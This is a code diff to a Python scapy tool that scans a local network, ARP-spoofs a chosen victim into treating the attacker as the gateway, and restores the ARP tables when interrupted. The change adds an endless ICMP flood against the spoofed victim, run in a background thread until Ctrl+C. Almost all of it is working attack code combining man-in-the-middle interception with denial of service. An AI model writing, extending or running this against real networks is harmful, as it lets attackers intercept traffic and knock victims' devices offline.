@@ -3,8 +3,11 @@ import time
 import sys
 import requests
 import argparse
+from scapy.layers.inet import ICMP, IP
 from scapy.layers.l2 import ARP, Ether
 import netifaces
+import threading
+
 
 
 def get_vendor(mac_address):
@@ -67,6 +70,13 @@ def print_device_info(devices):
         print(f"{idx}: IP: {device['ip']} \t MAC: {device['mac']} \t Vendor: {device['vendor']}")
 
 
+def icmp_flood(target_ip, iface):
+    print(f"[⚡] Starting ICMP flood on {target_ip} via {iface}...")
+    while True:
+        packet = IP(dst=target_ip)/ICMP()/Raw(load="X"*600)
+        send(packet, iface=iface, verbose=0)
+
+
 def spoof(target_IP, spoof_ip, target_MAC):
     packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=spoof_ip)
     send(packet, verbose=False)
@@ -124,13 +134,12 @@ def main():
         spoof(target_IP, gateway_ip, target_MAC)
         print(f"Victim {target_IP} is now spoofed.")
 
-        wait_time = 120
-        print(f"Waiting {wait_time // 60} minutes...")
-        time.sleep(wait_time)
+        flood_thread = threading.Thread(target=icmp_flood, args=(target_IP, iface), daemon=True)
+        flood_thread.start()
 
-        print("Restoring ARP tables...")
-        restore(target_IP, gateway_ip, target_MAC, gateway_mac)
-        print("ARP table restored. Attack finished.")
+        print("Press Ctrl+C to stop the attack and restore ARP tables.")
+        while True:
+            time.sleep(1)
 
     except KeyboardInterrupt:
         print("\nInterrupted by user. Restoring ARP...")
